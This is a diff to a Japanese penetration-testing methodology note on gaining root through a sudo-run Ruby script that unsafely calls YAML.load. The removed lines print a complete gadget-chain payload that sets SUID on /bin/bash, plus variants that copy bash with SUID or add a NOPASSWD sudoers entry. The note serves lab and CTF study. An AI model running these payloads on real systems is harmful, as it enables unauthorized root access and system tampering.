@@ -269,62 +269,40 @@ sudo /snap/bin/docker exec --user root [CONTAINER_ID] \
 
 ```bash
 # [Target] sudo で実行されるスクリプトを確認
-cat /opt/update_dependencies.rb
+cat [スクリプトパス]
 ```
 
 確認ポイント：
 - `YAML.load` と `YAML.safe_load` のどちらを使っているか
-- 読み込むファイルのパスが相対パス（`"dependencies.yml"`）か絶対パスか
-- 絶対パスの場合、そのファイルが自分のホームディレクトリなど書き込み可能な場所にあるか
+- 読み込むファイルのパスが相対パス（`"dependencies.yml"` 等）か絶対パスか
+- 絶対パスの場合、そのファイルが書き込み可能な場所（自分のホームディレクトリ等）にあるか
 
 #### Step 2: 悪意ある YAML ファイルを書き込み可能なディレクトリに作成
 
-**事前準備（必須）：** スクリプトを実行するディレクトリ（相対パスの場合はカレントディレクトリが読み込み先になる）に `dependencies.yml` を配置する。
+**事前準備（必須）：**
+- ファイル名はスクリプト内の `YAML.load(File.read(...))` の引数で確認する
+- 相対パスの場合は **sudo を実行するカレントディレクトリ** にファイルを置く
+- `cat << 'EOF' >` でファイルを作成する（`'EOF'` をシングルクォートで囲むことで `!` 等がシェルに解釈されない）
 
 ```bash
 # [Target] ファイルを書き込み可能なディレクトリに移動
-cd /home/henry
+cd [ファイルを置くディレクトリ]
 
-# cat << 'EOF' > で YAML ファイルを作成
-# ポイント: 'EOF' をシングルクォートで囲むと、ヒアドキュメント内の
-#   !や$等の特殊文字がシェルに解釈されない（バックスラッシュエスケープ不要）
-cat << 'EOF' > dependencies.yml
----
-- !ruby/object:Gem::Installer
-    i: x
-- !ruby/object:Gem::SpecFetcher
-    i: x
-- !ruby/object:Gem::Requirement
-  requirements:
-    !ruby/object:Gem::Package::TarReader
-    io: &1 !ruby/object:Net::BufferedIO
-      io: &1 !ruby/object:Gem::Package::TarReader::Entry
-         read: 0
-         header: "abc"
-      debug_output: &1 !ruby/object:Net::WriteAdapter
-         socket: &1 !ruby/object:Gem::RequestSet
-             sets: !ruby/object:Net::WriteAdapter
-                 socket: !ruby/object:Gem::Installer
-                     i: x
-                 method_id: :system
-             git_set: "chmod +s /bin/bash"
-         method_id: :resolve
+# YAML ペイロードを作成して配置
+cat << 'EOF' > [スクリプトが読み込むファイル名]
+[ペイロード内容は CVE_Notes.md を参照]
 EOF
 ```
 
-**`git_set:` の値が実行されるコマンド。** `chmod +s /bin/bash` の代わりに以下も使える：
-```
-git_set: "cp /bin/bash /tmp/rootbash && chmod +s /tmp/rootbash"
-git_set: "echo 'henry ALL=(ALL) NOPASSWD:ALL' >> /etc/sudoers"
-```
+> YAML ペイロードの全文（Psych Gadget Chain）と `git_set:` のコマンド変種 → `../05_Tools_Reference/CVE_Notes.md`（Ruby YAML.load Psych Gadget Chain セクション）
 
 #### Step 3: sudo でスクリプトを実行
 
 ```bash
-# [Target] sudo 実行（エラーが出ても途中でコマンドが走る）
-sudo /usr/bin/ruby /opt/update_dependencies.rb
+# [Target] sudo 実行（エラーが出ても途中でコマンドが走ることがある）
+sudo /usr/bin/ruby [スクリプトパス]
 # エラー例: undefined method `map' for nil:NilClass (NoMethodError)
-# → エラーが出ても SUID が設定されていることがある
+# → エラーが出てもコマンドが実行済みの場合がある。次の Step で必ず確認する
 ```
 
 #### Step 4: SUID が設定されたことを確認してシェルを取得
@@ -342,14 +320,14 @@ id
 # uid=1000(henry) gid=1000(henry) euid=0(root) egid=0(root)
 ```
 
-#### Step 5（原状回復）
+#### Step 5（原状回復・必須）
 
 ```bash
-# SUID を元に戻す（本番環境・実環境では必須）
+# [Target] SUID を元に戻す
 chmod -s /bin/bash
 
 # 作成した YAML ファイルを削除
-rm /home/henry/dependencies.yml
+rm [作成したファイル名]
 ```
 
 ### 刺さらなかったとき
